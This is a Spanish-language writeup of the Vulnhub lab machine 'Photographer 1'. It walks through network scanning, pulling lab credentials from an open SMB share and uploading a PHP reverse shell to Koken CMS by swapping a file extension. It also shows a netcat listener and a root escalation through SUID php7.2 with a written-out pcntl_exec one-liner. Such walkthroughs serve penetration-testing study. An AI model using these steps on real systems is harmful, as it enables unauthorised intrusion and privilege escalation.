---
title: Photographer 1 Writeup - Vulnhub
date: 2025-03-13
categories: [Writeups, Vulnhub OSCP Prep]
tags: [Linux, Vulnhub, CTF, Photographer1, OSCP Prep, fileupload, smbmap]
image:
  path: /assets/img/commons/vulnhub/Photographer1/portada.png
---

Anterior [*OSCP Lab 21*](https://lvs3c.github.io/posts/OSCP-GlasgowSmile2/)

¡Saludos!

**`OSCP Lab 22`**

En este writeup, realizaremos la máquina [**Photographer 1**](https://www.vulnhub.com/entry/photographer-1,519/). 

Se trata de una máquina **Linux** en la cual veremos:
- **Enumeración de servicios**.
- **SMBmap** para obtener archivo con credenciales.
- Generar reverse shell mediante **File Upload** usando BurpSuite, cambiando la extensión del archivo. Listamos la user flag.
- Y por último, tenemos permisos suid sobre el binario **php7.2**, elevamos nuestro privilegio y listamos la root flag.

Let's jump in!

## Reconocimiento activo

---

Necesitamos encontrar la ip correspondiente a la máquina, lo hacemos mediante la herramienta `arp-scan` y posteriormente el comando `ping` para verificar si la máquina objetivo está activa.

```bash
❯ sudo arp-scan -I ens37 --localnet --ignoredups
Interface: ens37, type: EN10MB, MAC: 00:0c:29:ef:5b:48, IPv4: 10.11.12.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.11.12.1      00:50:56:c0:00:01       VMware, Inc.
10.11.12.55     00:0c:29:97:18:a1       VMware, Inc.
10.11.12.200    00:50:56:e9:ee:69       VMware, Inc.

5 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.496 seconds (102.56 hosts/sec). 3 responded
```

```bash
❯ ping -c 1 10.11.12.55
PING 10.11.12.55 (10.11.12.55) 56(84) bytes of data.
64 bytes from 10.11.12.55: icmp_seq=1 ttl=64 time=0.483 ms

--- 10.11.12.55 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.483/0.483/0.483/0.000 ms
```

## Escaneo - Enumeración

---

A continuación, realizamos un escaneo con `Nmap`.

```bash
❯ sudo nmap -p- -sCV 10.11.12.55 -oN nmap_services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-13 13:47 -03
Nmap scan report for 10.11.12.55
Host is up (0.00035s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Photographer by v1n1v131r4
|_http-server-header: Apache/2.4.18 (Ubuntu)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8000/tcp open  http        Apache httpd 2.4.18
|_http-generator: Koken 0.22.24
|_http-title: daisa ahomi
|_http-server-header: Apache/2.4.18 (Ubuntu)
MAC Address: 00:0C:29:97:18:A1 (VMware)
Service Info: Hosts: PHOTOGRAPHER, example.com

Host script results:
|_clock-skew: mean: -1h39m59s, deviation: 2h18m35s, median: -3h00m00s
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: photographer
|   NetBIOS computer name: PHOTOGRAPHER\x00
|   Domain name: \x00
|   FQDN: photographer
|_  System time: 2025-03-13T09:48:15-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time:
|   date: 2025-03-13T13:48:12
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.87 seconds
```

El informe de `Nmap` nos revela:
- Puerto `80` servidor `Apache httpd 2.4.18`.
- Puerto `139` servidor `Samba smbd`.
- Puerto `445` servidor `Samba smbd`.
- Puerto `8000` servidor `Apache httpd 2.4.18`.


### SMB

Validamos las carpetas compartidas.

```bash
❯ smbmap -H 10.11.12.55
[+] Guest session       IP: 10.11.12.55:445     Name: 10.11.12.55
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        sambashare                                              READ ONLY       Samba on Ubuntu
        IPC$                                                    NO ACCESS       IPC Service (photographer server (Samba, Ubuntu))
```

Listamos el contenido de la carpeta sambashare.

```bash
❯ smbmap -H 10.11.12.55 -r sambashare
[+] Guest session       IP: 10.11.12.55:445     Name: 10.11.12.55
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        sambashare                                              READ ONLY
        .\sambashare\*
        dr--r--r--                0 Mon Jul 20 22:30:07 2020    .
        dr--r--r--                0 Tue Jul 21 06:44:25 2020    ..
        fr--r--r--              503 Mon Jul 20 22:29:39 2020    mailsent.txt
        fr--r--r--         13930308 Mon Jul 20 22:22:23 2020    wordpress.bkp.zip
```

Extraemos los archivos y validamos su contenido.

```bash
❯ smbmap -H 10.11.12.55 --download sambashare/mailsent.txt
[+] Starting download: sambashare\mailsent.txt (503 bytes)
[+] File output to: /home/lvs3c/CTF/VulnHub/Photographer1/10.11.12.55/content/10.11.12.55-sambashare_mailsent.txt
```

![smbmail](/assets/img/commons/vulnhub/Photographer1/smbmail.png){: .center-image }

Tenemos un usuario y una contraseña: `daisa@photographer.com:babygirl`{: .filepath}


### HTTP - 80 - 8000

![web80](/assets/img/commons/vulnhub/Photographer1/web80.png){: .center-image }
![web8000](/assets/img/commons/vulnhub/Photographer1/web8000.png){: .center-image }

Continuamos realizando un fuzzing de directorios rápido con el script `http-enum` de nmap.

```bash
❯ sudo nmap -p80,8000 --script http-enum 10.11.12.55 -oN nmap_webscan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-13 14:15 -03
Nmap scan report for 10.11.12.55
Host is up (0.00029s latency).

PORT     STATE SERVICE
80/tcp   open  http
| http-enum:
|_  /images/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
8000/tcp open  http-alt
| http-enum:
|   /admin/: Possible admin folder
|   /admin/index.html: Possible admin folder
|   /app/: Potentially interesting folder
|   /content/: Potentially interesting folder
|   /error/: Potentially interesting folder
|   /home/: Potentially interesting folder
|_  /index/: Potentially interesting folder
MAC Address: 00:0C:29:97:18:A1 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 4.64 seconds
```

Sobre el puerto 8000, tenemos un panel de login.

![login](/assets/img/commons/vulnhub/Photographer1/login.png){: .center-image }

Ingresamos las credenciales obtenidas anteriormente y estamos dentro, .

![loginaccess](/assets/img/commons/vulnhub/Photographer1/loginaccess.png){: .center-image }

## Explotación

---

Validamos en searchsploit si existe algún exploit sobre `koken`.

![searchsploit](/assets/img/commons/vulnhub/Photographer1/searchsploit.png){: .center-image }

Nos encontramos ante una vulnerabilidad sobre `file upload`. Es decir, mediante BurpSuite obtenemos la petición para la carga de una imagen y le cambiamos la extensión por `.php`.

![fileupload](/assets/img/commons/vulnhub/Photographer1/fileupload.png){: .center-image }
![bs](/assets/img/commons/vulnhub/Photographer1/bs.png){: .center-image }
![fileupload2](/assets/img/commons/vulnhub/Photographer1/fileupload2.png){: .center-image }


Comprobamos el archivo y generamos la reverse shell.

![rs](/assets/img/commons/vulnhub/Photographer1/rs.png){: .center-image }
![rs2](/assets/img/commons/vulnhub/Photographer1/rs2.png){: .center-image }

```bash
❯ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.11.12.10] from (UNKNOWN) [10.11.12.55] 37970
bash: cannot set terminal process group (1522): Inappropriate ioctl for device
bash: no job control in this shell
www-data@photographer:/var/www/html/koken/storage/originals/f6/d9$
```

## Escalación de privilegios

---

Listamos la user flag.

```bash
www-data@photographer:/home/daisa$ cat user.txt
d41d8cd98f00b204e9800998ecf8427e
```

Listamos los `binarios SUID`{: .filepath} del sistema y vemos que tenemos permisos sobre `php7.2`. Usamos [gtfobins](https://gtfobins.github.io/gtfobins/php/#suid).

Listamos la root flag.

```bash
www-data@photographer:/home/daisa$ find / -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/sbin/pppd
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/php7.2
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/chfn
/bin/ping
/bin/fusermount
/bin/mount
/bin/ping6
/bin/umount
/bin/su

www-data@photographer:/home/daisa$ /usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
# cd /root
# ls
proof.txt
# cat proof.txt

                                .:/://::::///:-`
                            -/++:+`:--:o:  oo.-/+/:`
                         -++-.`o++s-y:/s: `sh:hy`:-/+:`
                       :o:``oyo/o`. `      ```/-so:+--+/`
                     -o:-`yh//.                 `./ys/-.o/
                    ++.-ys/:/y-                  /s-:/+/:/o`
                   o/ :yo-:hNN                   .MNs./+o--s`
                  ++ soh-/mMMN--.`            `.-/MMMd-o:+ -s
                 .y  /++:NMMMy-.``            ``-:hMMMmoss: +/
                 s-     hMMMN` shyo+:.    -/+syd+ :MMMMo     h
                 h     `MMMMMy./MMMMMd:  +mMMMMN--dMMMMd     s.
                 y     `MMMMMMd`/hdh+..+/.-ohdy--mMMMMMm     +-
                 h      dMMMMd:````  `mmNh   ```./NMMMMs     o.
                 y.     /MMMMNmmmmd/ `s-:o  sdmmmmMMMMN.     h`
                 :o      sMMMMMMMMs.        -hMMMMMMMM/     :o
                  s:     `sMMMMMMMo - . `. . hMMMMMMN+     `y`
                  `s-      +mMMMMMNhd+h/+h+dhMMMMMMd:     `s-
                   `s:    --.sNMMMMMMMMMMMMMMMMMMmo/.    -s.
                     /o.`ohd:`.odNMMMMMMMMMMMMNh+.:os/ `/o`
                      .++-`+y+/:`/ssdmmNNmNds+-/o-hh:-/o-
                        ./+:`:yh:dso/.+-++++ss+h++.:++-
                           -/+/-:-/y+/d:yh-o:+--/+/:`
                              `-///////////////:`


Follow me at: http://v1n1v131r4.com


d41d8cd98f00b204e9800998ecf8427e
#
```

Hope it helps!